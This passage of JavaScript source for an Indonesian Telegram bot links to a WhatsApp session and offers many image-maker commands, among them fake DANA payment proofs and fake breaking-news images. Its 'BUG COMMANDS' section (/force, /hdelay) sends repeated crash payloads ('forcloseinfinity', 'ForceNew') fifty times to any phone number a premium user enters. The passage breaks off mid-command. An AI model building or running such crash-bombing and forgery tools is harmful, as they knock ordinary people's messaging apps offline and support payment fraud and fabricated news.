    return ctx.reply('Format salah!\nGunakan: /sketch [link_gambar]\nContoh:\n/sketch https://example.com/foto.jpg');
  }

  if (!imageUrl.startsWith('http://') && !imageUrl.startsWith('https://')) {
    return ctx.reply('Input harus berupa link URL gambar yang valid! (Harus diawali http:// atau https://)');
  }

  await ctx.reply('Sedang memproses gambar dari link menjadi sketsa, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/image2sketch?url=${encodeURIComponent(imageUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: 'Sukses Mengubah Menjadi Sketsa dari Link!*',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan atau server API sedang down.');
  }
});

bot.command('fakedana', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const amount = textInput.trim();

  if (!amount) {
    return ctx.reply('Format salah!\nGunakan: /fakedana [nominal]\n\nContoh:\n/fakedana 50000');
  }

  if (isNaN(amount)) {
    return ctx.reply('Nominal harus berupa angka saja tanpa titik/koma! (Contoh: 100000)');
  }

  await ctx.reply('Sedang memproses gambar prank, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/fakedana?amount=${encodeURIComponent(amount)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Generate Fake DANA\nNominal: Rp ${parseInt(amount).toLocaleString('id-ID')}\nGunakan dengan bijak untuk prank teman!`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat mengambil data dari API.');
  }
});

bot.command('igc', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan: /igc link_foto | nama grup | jumlah peserta\n\nContoh:\n/igc https://example.com/pp.jpg | Xylent Empire | 2,500 Peserta');
  }

  const [urlProfil, namaGroup, jumlahPeserta] = textInput.split('|');

  if (!urlProfil || !namaGroup || !jumlahPeserta) {
    return ctx.reply('Semua kolom harus diisi! Pastikan gunakan tanda pembatas | dengan benar.');
  }

  const linkProfil = urlProfil.trim();
  if (!linkProfil.startsWith('http://') && !linkProfil.startsWith('https://')) {
    return ctx.reply('Parameter pertama harus berupa link URL foto profil yang valid (diawali http/https)!');
  }

  await ctx.reply('Sedang Proses tampilan iPhone Group Chat, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/igc?url=${encodeURIComponent(linkProfil)}&name=${encodeURIComponent(namaGroup.trim())}&member=${encodeURIComponent(jumlahPeserta.trim())}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Generate iPhone Group Chat\nGroup: ${namaGroup.trim()}`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses data ke API.');
  }
});

bot.command('iqc', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const quoteText = textInput.trim();

  if (!quoteText) {
    return ctx.reply('Format salah!\nGunakan: /iqc [teks]\n\nContoh:\n/iqc Jangan lupa upgrade ke VIP!');
  }

  await ctx.reply('Sedang membuat iPhone Quote Chat, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/iqc?text=${encodeURIComponent(quoteText)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: 'Sukses Generate iPhone Quote Chat!',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
  }
});

bot.command('iqcsticker', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan: /iqcsticker link_pp | isi teks chat\n\nContoh:\n/iqc_sticker https://example.com/pp.jpg | Info crash wa hari ini');
  }

  const [urlProfil, textChat] = textInput.split('|');

  if (!urlProfil || !textChat) {
    return ctx.reply('Semua kolom harus diisi! Pastikan gunakan pembatas | dengan benar.');
  }

  const linkProfil = urlProfil.trim();

  if (!linkProfil.startsWith('http://') && !linkProfil.startsWith('https://')) {
    return ctx.reply('Parameter pertama harus berupa link URL foto profil yang valid!');
  }

  await ctx.reply('Sedang Proses, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/iqc-sticker?text=${encodeURIComponent(textChat.trim())}&img=${encodeURIComponent(linkProfil)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Generate iPhone Quote Sticker!`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
  }
});

bot.command('music', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan: /music link_thumbnail | judul lagu\n\nContoh:\n/music https://example.com/cover.jpg | Cyberpunk 2026 Soundtrack');
  }

  const [imgUrl, musicName] = textInput.split('|');

  if (!imgUrl || !musicName) {
    return ctx.reply('Kedua kolom harus diisi! Pastikan gunakan pembatas | dengan benar.');
  }

  const cleanImgUrl = imgUrl.trim();

  if (!cleanImgUrl.startsWith('http://') && !cleanImgUrl.startsWith('https://')) {
    return ctx.reply('Parameter pertama harus berupa link URL thumbnail gambar yang valid (diawali http/https)!');
  }

  await ctx.reply('Sedang Proses tampilan Music Player, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/music?img=${encodeURIComponent(cleanImgUrl)}&name=${encodeURIComponent(musicName.trim())}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Generate Music Player!\n🎵 Lagu: ${musicName.trim()}`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
  }
});

bot.command('tanyaustadz', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const ustadzQuery = textInput.trim();

  if (!ustadzQuery) {
    return ctx.reply('Format salah!\nGunakan: /tanyaustadz [pertanyaan]\n\nContoh:\n/tanyaustadz Ustadz, bagaimana hukumnya memakai script orang lain?');
  }

  await ctx.reply('Sedang Proses Tanya Ustadz, mohon tunggu...');

  try {
    const apiUrl = `https://api.azbry.com/api/maker/tanyaustadz?text=${encodeURIComponent(ustadzQuery)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: 'Sukses Generate Mockup Tanya Ustadz',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API.');
  }
});

bot.command('threads', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan urutan sesuai dokumentasi API:\n/threads nama | username | link_prof | isi_post | waktu\n\nContoh lengkap:\n/threads xyzen | xyzenofficial | https://link.com/pic.jpg | Halo Dunia | 5m');
  }

  const parts = textInput.split('|').map(p => p.trim());

  const name = parts[0];
  const username = parts[1];
  const pfp = parts[2];
  const textChat = parts[3];
  const waktu = parts[4];

  if (!name || !textChat) {
    return ctx.reply('Gagal! Parameter Nama (ke-1) dan Isi Post (ke-4) wajib diisi.\n\nFormat: nama | username | link_pfp | isi_post | waktu');
  }

  await ctx.reply('Sedang Proses render tampilan Threads Post, mohon tunggu...');

  try {
    let apiUrl = `https://api.azbry.com/api/maker/threadspost?name=${encodeURIComponent(name)}&text=${encodeURIComponent(textChat)}`;

    if (username) apiUrl += `&username=${encodeURIComponent(username)}`;
    if (pfp) apiUrl += `&pfp=${encodeURIComponent(pfp)}`;
    if (waktu) apiUrl += `&waktu=${encodeURIComponent(waktu)}`;

    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Create Threads Post!`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses data ke API.');
  }
});

bot.command('winquote', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');
  const quote = textInput.trim();

  if (!quote) {
    return ctx.reply('Format salah!\nGunakan: /winquote [teks]\n\nContoh:\n/winquote kenapa nyahh aku salah mulu');
  }

  await ctx.reply('Sedang Proses Generate Windows Media Player Quotes, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/windows-quotes.php?text=${encodeURIComponent(quote)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: 'Sukses Generate Windows Quotes!',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat mengambil data dari API.');
  }
});

bot.command('lobbyff', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan: /lobbyff nickname | versi_background\n\nContoh:\n/lobbyff Nanas | 9');
  }

  const [nickname, versi] = textInput.split('|').map(p => p.trim());

  if (!nickname || !versi || isNaN(versi)) {
    return ctx.reply('Gagal! Nickname dan versi (harus angka) wajib diisi.\n\nFormat: /lobbyff nama | versi');
  }

  await ctx.reply('Sedang menyiapkan lobby Free Fire kamu, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ff.php?nickname=${encodeURIComponent(nickname)}&versi=${encodeURIComponent(versi)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Generate Fake Lobby FF\n👤 Nickname: *${nickname}*\n🖼️ Versi Background: *${versi}*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan. Pastikan pilihan versi latar belakang tersedia.');
  }
});

bot.command('lobbyml', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/lobbyml username | link_avatar | rank | indeks_border\n\nContoh:\n/lobbyml Owiee | https://example.com/avatar.jpg | imo | 0\n\nPilihan Rank: epic, glory, gm, honor, imo, mawi, legend');
  }

  const [username, avatarUrl, rank, border] = textInput.split('|').map(p => p.trim());

  if (!username || !avatarUrl || !rank || border === undefined || border === '') {
    return ctx.reply('Semua kolom (Username, Link Avatar, Rank, dan Border) wajib diisi!\nFormat: /lobbyml nama | link | rank | border');
  }

  if (!avatarUrl.startsWith('http://') && !avatarUrl.startsWith('https://')) {
    return ctx.reply('Parameter kedua harus berupa link URL avatar gambar yang valid (diawali http/https)!');
  }

  const validRanks = ['epic', 'glory', 'gm', 'honor', 'imo', 'mawi', 'legend'];
  if (!validRanks.includes(rank.toLowerCase())) {
    return ctx.reply(`Rank tidak valid! Pilih salah satu dari: ${validRanks.join(', ')}`);
  }

  await ctx.reply('Sedang Proses Generate Fake Lobby MLBB, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-lobby-ml.php?username=${encodeURIComponent(username)}&avatar=${encodeURIComponent(avatarUrl)}&rank=${encodeURIComponent(rank.toLowerCase())}&border=${encodeURIComponent(border)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Generate Fake Lobby MLBB\n👤 Nickname: ${username}\n🏅 Rank: ${rank.toUpperCase()}\n🖼️ Border ID: *${border}*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API. Pastikan semua parameter diisi dengan benar.');
  }
});

bot.command('storyig', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/storyig nama_user | teks_story | link_gambar_background\n\nContoh:\n/storyig John Doe | Hello World | https://example.com/bg.jpg');
  }

  const [name, textStory, bgUrl] = textInput.split('|').map(p => p.trim());

  if (!name || !textStory || !bgUrl) {
    return ctx.reply('Semua kolom (Nama, Teks, dan Link Gambar) wajib diisi dengan benar!');
  }

  if (!bgUrl.startsWith('http://') && !bgUrl.startsWith('https://')) {
    return ctx.reply('Parameter ketiga harus berupa link URL background gambar yang valid!');
  }

  await ctx.reply('Sedang Proses Generate Instagram Story Mockup, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/fake-story-ig.php?name=${encodeURIComponent(name)}&text=${encodeURIComponent(textStory)}&url=${encodeURIComponent(bgUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Generate Instagram Story!`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses mockup Instagram Story.');
  }
});

bot.command('berita', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/berita judul_berita | link_gambar_berita\n\nContoh:\n/berita Viral! Jokowi mencuri 19jt lapangan pekerjaan | https://example.com/jokowi.webp');
  }

  const [judul, imgUrl] = textInput.split('|').map(p => p.trim());

  if (!judul || !imgUrl) {
    return ctx.reply('Kedua kolom (Judul Berita & Link Gambar) wajib diisi!');
  }

  if (!imgUrl.startsWith('http://') && !imgUrl.startsWith('https://')) {
    return ctx.reply('Parameter kedua harus berupa link URL gambar berita yang valid!');
  }

  await ctx.reply('Sedang Proses Generate iNews Breaking News, mohon tunggu...');

  try {
    const apiUrl = `https://api-nanzz.my.id/docs/api/maker/berita.php?text=${encodeURIComponent(judul)}&url=${encodeURIComponent(imgUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `Sukses Generate Fake Breaking News!\n📰 Berita: ${judul}`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar ke API Berita.');
  }
});

bot.command('randompap', async (ctx) => {
  await ctx.reply('Sedang mencari gambar PAP acak, mohon tunggu...');

  try {
    const apiUrl = 'https://api-nanzz.my.id/docs/api/random/random-pap.php';
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: '*📸 Sukses Mengambil Random PAP!*',
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat mengambil data gambar dari API. Coba lagi beberapa saat lagi.');
  }
});

bot.command('fakecall', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/fakecall nama_penelepon | durasi_waktu | link_foto_profil\n\nContoh:\n/fakecall Ayank | 00:00 | https://c.top4top.io/p_3815w0ycy1.jpg');
  }

  const [name, time, ppUrl] = textInput.split('|').map(p => p.trim());

  if (!name || !time || !ppUrl) {
    return ctx.reply('Semua kolom (Nama, Waktu, dan Link PP) wajib diisi!');
  }

  if (!ppUrl.startsWith('http://') && !ppUrl.startsWith('https://')) {
    return ctx.reply('Parameter ketiga harus berupa link URL foto profil yang valid!');
  }

  await ctx.reply('Sedang Proses Generate tampilan panggilan palsu, mohon tunggu...');

  try {
    const apiUrl = `https://api.synoxcloud.xyz/canvas/fakecall?name=${encodeURIComponent(name)}&time=${encodeURIComponent(time)}&pp=${encodeURIComponent(ppUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `*Sukses Generate Fakecall!*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses gambar fakecall ke API.');
  }
});

bot.command('idcard', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/idcard nama | jabatan/title | nama_script | link_kontak\n\nContoh:\n/idcard Saurus | Creator | Api synox | https://t.me/lordsaurus');
  }

  const [name, title, script, contact] = textInput.split('|').map(p => p.trim());

  if (!name || !title || !script || !contact) {
    return ctx.reply('Semua kolom (Nama, Title, Script, dan Kontak) harus diisi lengkap!');
  }

  await ctx.reply('Sedang Proses Genarate  Developer ID Card Mohon Tunggu.');

  try {
    const apiUrl = `https://api.synoxcloud.xyz/canvas/idcard?name=${encodeURIComponent(name)}&title=${encodeURIComponent(title)}&script=${encodeURIComponent(script)}&contact=${encodeURIComponent(contact)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: ` *Sukses Generate Developer ID Card!*\n👤 Owner: *${name}*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses Developer ID Card.');
  }
});

bot.command('spotifycard', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/spotifycard judul_lagu | nama_artis | link_cover_album\n\nContoh:\n/spotifycard Bergema sampai selamanya | Nadhif Basalamah | https://c.top4top.io/p_3815mp2s21.jpg');
  }

  const [title, artist, coverUrl] = textInput.split('|').map(p => p.trim());

  if (!title || !artist || !coverUrl) {
    return ctx.reply('Semua kolom (Judul, Artis, dan Link Cover) wajib diisi!');
  }

  if (!coverUrl.startsWith('http://') && !coverUrl.startsWith('https://')) {
    return ctx.reply('Parameter ketiga harus berupa link URL cover album yang valid!');
  }

  await ctx.reply('Sedang membuat Spotify Now Playing card mohon tunggu...');

  try {
    const apiUrl = `https://api.synoxcloud.xyz/canvas/spotifycard?title=${encodeURIComponent(title)}&artist=${encodeURIComponent(artist)}&cover=${encodeURIComponent(coverUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `*Sukses Generate Spotify Card!*\n🎵 *${title}* — ${artist}`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat mengambil data gambar Spotify dari API.');
  }
});

bot.command('ttqc', async (ctx) => {
  const textInput = ctx.message.text.split(' ').slice(1).join(' ');

  if (!textInput) {
    return ctx.reply('Format salah!\nGunakan pembatas |\n/ttqc username | teks_chat | link_avatar\n\nContoh:\n/ttqc Saurus | Just friend kok cemburu😸 | https://c.top4top.io/p_3827ycihz1.jpg');
  }

  const [username, textChat, avatarUrl] = textInput.split('|').map(p => p.trim());

  if (!username || !textChat || !avatarUrl) {
    return ctx.reply('Semua kolom (Username, Teks Chat, dan Link Avatar) wajib diisi!');
  }

  if (!avatarUrl.startsWith('http://') && !avatarUrl.startsWith('https://')) {
    return ctx.reply('Parameter ketiga harus berupa link URL avatar yang valid!');
  }

  await ctx.reply('Sedang Proses Generate TikTok Quote Chat Mohon Tunggu');

  try {
    const apiUrl = `https://api.synoxcloud.xyz/canvas/ttqc?username=${encodeURIComponent(username)}&text=${encodeURIComponent(textChat)}&avatar=${encodeURIComponent(avatarUrl)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'utf-8');

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `*Sukses Generate TikTok Quote Chat!*`,
      parse_mode: 'Markdown',
      reply_to_message_id: ctx.message.message_id
    });
  } catch (error) {
    console.error(error);
    ctx.reply('Terjadi kesalahan saat memproses data ke API Canvas TikTok.');
  }
});

// ============================================================
//  COMMAND ADDADMIN DLL
// ============================================================
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example: /addadmin 12345678");
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(ADMIN_FILE, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});

bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(PREMIUM_FILE, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /deladmin 12345678");
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(ADMIN_FILE, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});

bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /delprem 12345678");
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(PREMIUM_FILE, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// ============================================================
//  WHATSAPP CONNECT
// ============================================================
const vidthumbnail = "https://e.top4top.io/p_3835vr5d01.jpg";

bot.command("connect", async (ctx) => {
  if (ctx.from.id != OWNER_IDS) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "X7ENGINE");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMenu = `
<blockquote><pre>⬡╗─—⊱ ⌧ 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 ⌭ ⊰—─╗⬡</pre></blockquote>
⬡ Number: ${phoneNumber}
⬡ Pairing Code: ${formattedCode}
⬡ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(vidthumbnail, {
      caption: pairingMenu,
      parse_mode: "HTML"
    });

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

// ============================================================
//  CONNECTION UPDATE HANDLER
// ============================================================
if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>⬡╗─—⊱ ⌧  𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 ⌭ ⊰—─╗⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected`;

      try {
        await bot.telegram.editMessageCaption(
          lastPairingMessage.chatId,
          lastPairingMessage.messageId,
          undefined,
          updateConnectionMenu,
          { parse_mode: "HTML" }
        );
      } catch (e) {}
    }
  });
}

// ============================================================
//  RESET SESSION
// ============================================================
bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != OWNER_IDS) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// ============================================================
//  STATUS
// ============================================================
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

// ============================================================
//  BUG COMMANDS
// ============================================================

bot.command("force", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /force 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/e00cir.jpg", {
    caption: `
<blockquote>交 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /force
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug Ui ${i + 1}/50 To ${q}`));
      await forcloseinfinity(sock, target);
      await ForceNew(sock, target);
      await sleep(500);
    }
});

//delay
bot.command("hdelay", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /hdelay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/e00cir.jpg", {
    caption: `
<blockquote>交 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /hdelay
`,
    parse_mode: "HTML",
    reply_markup: {
